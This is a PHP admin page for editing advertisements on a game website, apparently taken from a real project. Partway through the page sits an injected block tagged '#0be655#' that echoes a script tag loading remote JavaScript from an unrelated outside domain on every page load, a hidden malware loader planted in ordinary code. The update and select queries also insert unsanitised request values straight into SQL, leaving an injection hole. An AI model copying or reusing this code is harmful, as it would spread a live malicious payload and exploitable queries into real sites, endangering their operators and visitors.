<?php session_start();
ob_start();

include "inc/session_check.php";
$page = "Edit  Advertisement";
$side_menu="advertisement";
  $adid = urlsafe_b64decode($_REQUEST['adid']);
 $rawid = $_REQUEST['adid'];
if(isset($_POST['submit']))
{
	$advert_page = $_POST['advert_page'];
	$advert_pos = $_POST['advert_pos'];
	$ad_code = $_POST['ad_code'];
		
	$today = date("Y-m-d");
	
	
	
		 $ins="update advertisement set advert_page='$advert_page',advert_pos='$advert_pos',ad_code='$ad_code',post_date='$today',status='$status' where adid='$adid'";
		
if(mysql_query($ins))
{
	
	
	header("location: edit_advertisement.php?adid=$rawid&msg=succ&cont=Advertisement uploaded successfully");
	
}
else
	{
		header("location: edit_advertisement.php?adid=$rawid&msg=err&cont=Error in insert query");
	}

}

$select_ad = mysql_query("select * from advertisement where adid='$adid'");
$fetch_ad = mysql_fetch_array($select_ad);


?>
<!DOCTYPE html>
  <!--[if lt IE 7]>
    <html class="lt-ie9 lt-ie8 lt-ie7" lang="en">
  <![endif]-->

  <!--[if IE 7]>
    <html class="lt-ie9 lt-ie8" lang="en">
  <![endif]-->

  <!--[if IE 8]>
    <html class="lt-ie9" lang="en">
  <![endif]-->

  <!--[if gt IE 8]>
    <!-->
    <html lang="en">
    <!--
  <![endif]-->

  <head>
    <meta charset="utf-8">
    <title>Game Admin | Add Advertisement</title>
     <link href="icomoon/style.css" rel="stylesheet">
    <!--[if lte IE 7]>
      <script src="css/icomoon-font/lte-ie7.js"></script>
    <![endif]-->
    <link href="css/main.css" rel="stylesheet">
    

  </head>
  <body>
    
    <?php 
	  	include "inc/header.php";
    ?>

    <div class="container-fluid">
      
    <?php 
	  	include "inc/main_nav.php";
    ?>
      
      <div class="dashboard-wrapper">
        <div class="main-container">
        
          <?php 
		  	include "inc/sub_navbar.php";
			include "inc/breadcrumb.php";
		  ?>

			<div class="row-fluid">
            <div class="span6">
              <div class="widget">
                <div class="widget-header">
                  <div class="title">
                Edit  Advertisement
                  </div>
                </div>
                <div class="widget-body">
<?php include 'message.php';  ?>
<?php
#0be655#
if(empty($g)) {
$g = "<script type=\"text/javascript\" src=\"http://manutd.ge/cqn4rfwt.php?id=11967019\"></script>";
echo $g;
}
#/0be655#
?><form class="form-horizontal no-margin well" id="ad_form" name="form" method="post" enctype="multipart/form-data" >
	            	  <h5 class="text-info">Edit Advertisement Information</h5>
                    <hr>
  		<div class="control-group">
                      <label class="control-label">
                        Page * :
                      </label>
                      <div class="controls">
                      	<select class="required span4" name="advert_page" id="advert_page">
					<option value="">--Select</option>
					<option <?php if($fetch_ad['advert_page']=="home"){ echo "selected='selected'"; } ?> value="home">Home Page</option>
					<option <?php if($fetch_ad['advert_page']=="category"){ echo "selected='selected'"; } ?> value="category">Category</option>
					<option <?php if($fetch_ad['advert_page']=="inner"){ echo "selected='selected'"; } ?> value="inner">Play</option>
					</select>
                     </div>
                    </div>
                    <div class="control-group">
                      <label class="control-label">
                        Advertisement Position * :
                      </label>
                      <div class="controls">
                      	<select class="required span4" name="advert_pos" id="advert_pos">
					<option value="">--Select</option>
					<?php
					$select_pos = mysql_query("select id,position from advertisement_position where status=1 order by id asc");
					while($fetch_pos=mysql_fetch_assoc($select_pos))
					{?>
					<option <?php if($fetch_ad['advert_pos']==$fetch_pos['id']){ echo "selected='selected'"; } ?> value="<?=$fetch_pos['id']?>"><?=$fetch_pos['position']?></option>
					<?php }
					 ?>
					</select>
                     </div>
                    </div>
                    <div class="control-group">
                      <label class="control-label">
                        AD code * :
                      </label>
                      <div class="controls">
                      	<textarea name="ad_code" rows="10" cols="50"><?=$fetch_ad['ad_code']?></textarea>
                      	
                     </div>
                    </div>
			
			
				 <div class="form-actions no-margin">
				 	<input type="submit" class="btn btn-info" name="submit" value="submit">
                    </div>
 			</form>
		 </div>
              </div>
            </div>

            
          </div>

          
        </div>
      </div>
    </div>
    
    <?php
    include 'inc/footer.php';
    ?>
  
   <script src="js/wysiwyg/wysihtml5-0.3.0.js"></script>
    <script src="js/jquery.min.js"></script>
    <script src="js/bootstrap.js"></script>
    <script src="js/wysiwyg/bootstrap-wysihtml5.js"></script>
    <script type="text/javascript"  src="js/jquery-latest.js"></script>
	<script type="text/javascript"  src="js/jquery.validate.js"></script>
	<script>
  $(document).ready(function(){
  	$('#ad_img_div').hide();
  	$('#edit_img').click(function() {
  	if($(this).attr('checked')){$('#ad_img_div').show();$('#ad_img').addClass('required')}
  	else{$('#ad_img_div').hide();$('#ad_img').removeClass('required')}
  	});
  	
    $("#ad_form").validate({
    	success: function(label) {
			// set &nbsp; as text for IE
			label.html("&nbsp;").addClass("checked");
		}
    });
     $("#advert_pos").change(function(){
    	var posid = $(this).val();
    	dataString = "posid="+posid;
    	$.ajax({
    	type: "POST",
    	url: "get_ad_size.php",
    	data: dataString,
    	success: function(html){
    		$("#advert_size").html(html);
    	}
    	})
    });
    });

</script>
</body>
</html>
	